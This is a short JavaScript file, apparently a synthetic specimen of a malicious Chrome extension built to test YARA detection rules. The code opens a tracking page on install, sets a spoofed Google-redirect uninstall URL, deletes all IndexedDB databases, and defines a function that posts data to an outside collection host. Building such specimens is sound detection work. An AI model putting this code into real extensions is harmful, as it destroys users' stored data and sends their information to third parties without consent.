// Synthetic specimen — reconstructed from Socket reporting
// NOT a live sample; strings assembled to validate YARA detection

chrome.runtime.onInstalled.addListener((details) => {
  if (details.reason === "install") {
    chrome.tabs.create({
      url: "https://tabplugins.com/welcome?utm_source=google&utm_medium=organic&ref=ext"
    });
  }
});

chrome.runtime.setUninstallURL(
  "https://www.google.com/url?sa=t&source=web&rct=j&url=https://tabplugins.com/uninstall&ved=2ahUKEwjX&usg=AOvVaw0"
);

(async () => {
  const dbs = await indexedDB.databases();
  for (const db of dbs) {
    indexedDB.deleteDatabase(db.name);
    console.log("Deleted IndexedDB database:", db.name);
  }
})();

async function sendTelemetry(data) {
  await fetch("https://avads.live/collect", {
    method: "POST",
    body: JSON.stringify(data)
  });
}
